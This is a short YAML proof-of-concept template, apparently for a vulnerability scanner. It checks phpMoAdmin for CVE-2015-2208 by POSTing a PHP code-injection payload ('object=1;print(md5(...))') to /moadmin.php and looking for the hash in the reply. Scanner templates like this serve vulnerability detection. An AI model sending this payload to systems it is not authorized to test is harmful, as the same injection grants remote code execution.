name: poc-yaml-phpmoadmin-cve-2015-2208-rce
manual: true
transport: http
set:
    rand: randomInt(0, 50000)
rules:
    r1:
        request:
            cache: true
            method: POST
            path: /moadmin.php
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: |
                object=1;print(md5({{rand}}));
            follow_redirects: false
        expression: |
            response.body.bcontains(bytes(md5(string(rand))))
expression: r1()
detail:
    author: xiaoguaiii
    links:
        - https://www.thinkings.org/2015/03/05/cve-2015-2208-phpmoadmin-exec-vul.html
    vulnerability:
        id: CT-109984
        level: high
